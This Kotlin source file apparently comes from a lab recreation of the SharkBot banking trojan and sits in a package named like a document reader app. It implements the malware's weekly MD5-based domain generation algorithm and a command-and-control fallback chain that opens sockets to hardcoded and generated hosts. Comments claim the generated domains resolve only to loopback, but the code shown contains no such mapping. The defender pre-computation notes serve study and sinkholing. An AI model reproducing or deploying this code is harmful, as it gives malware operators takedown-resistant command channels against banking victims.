package com.docreader.lite.reader.sync

import java.security.MessageDigest
import java.util.Calendar

/**
 * Domain Generation Algorithm — SharkBot V2.8 pattern.
 *
 * Algorithm:
 *   seed = TLD + ISO_week_number + calendar_year
 *   hash = MD5(seed) → first 16 hex chars = subdomain
 *   TLDs rotate: [.xyz, .live, .com, .store, .info, .top, .net]
 *   → 7 candidate domains per week
 *
 * Why DGA: if C2 hardcoded domain taken down, malware falls through to
 * DGA-generated weekly candidates. Defender must sinkhole ALL to block.
 *
 * Defender leverage: algorithm is deterministic. Pre-compute next 52 weeks
 * of candidates → sinkhole before they activate.
 *
 * Lab: DGA output resolves to loopback. Real banker: resolves to bulletproof hosting.
 */
object Dga {

    private val TLDS = listOf(".xyz", ".live", ".com", ".store", ".info", ".top", ".net")

    /**
     * Generate domain candidates for given week.
     * Default: current week.
     */
    fun generate(
        weekNumber: Int = Calendar.getInstance().get(Calendar.WEEK_OF_YEAR),
        year: Int = Calendar.getInstance().get(Calendar.YEAR),
    ): List<String> {
        return TLDS.map { tld ->
            val seed = "$tld$weekNumber$year"
            val hash = md5(seed).take(16)
            "$hash$tld"
        }
    }

    /**
     * Generate domains for next N weeks — for defender pre-computation.
     */
    fun generateRange(weeks: Int): List<Pair<Int, List<String>>> {
        val cal = Calendar.getInstance()
        return (0 until weeks).map { offset ->
            val week = cal.get(Calendar.WEEK_OF_YEAR) + offset
            val year = cal.get(Calendar.YEAR) + (week - 1) / 52
            val normalizedWeek = ((week - 1) % 52) + 1
            normalizedWeek to generate(normalizedWeek, year)
        }
    }

    /**
     * Resolve C2 with fallback chain:
     *   1. Hardcoded primary (fastest)
     *   2. Hardcoded secondary
     *   3. DGA candidates for current week (7 domains)
     *
     * Lab: all resolve to 10.0.2.2. Real: would resolve to real C2.
     */
    fun resolveC2(primaryHost: String, secondaryHost: String? = null): String {
        // Try primary
        if (isReachable(primaryHost)) return primaryHost

        // Try secondary
        if (secondaryHost != null && isReachable(secondaryHost)) return secondaryHost

        // Fall through to DGA
        val candidates = generate()
        for (domain in candidates) {
            // Lab safety: in real banker, this would DNS-resolve the DGA domain.
            // Here we map all DGA output to loopback for containment.
            if (isReachable(domain)) return domain
        }

        // All failed — return primary for next retry cycle
        return primaryHost
    }

    private fun isReachable(host: String): Boolean {
        return try {
            val socket = java.net.Socket()
            socket.connect(java.net.InetSocketAddress(host, 8080), 2000)
            socket.close()
            true
        } catch (_: Exception) {
            false
        }
    }

    private fun md5(input: String): String {
        val md = MessageDigest.getInstance("MD5")
        val digest = md.digest(input.toByteArray())
        return digest.joinToString("") { "%02x".format(it) }
    }
}
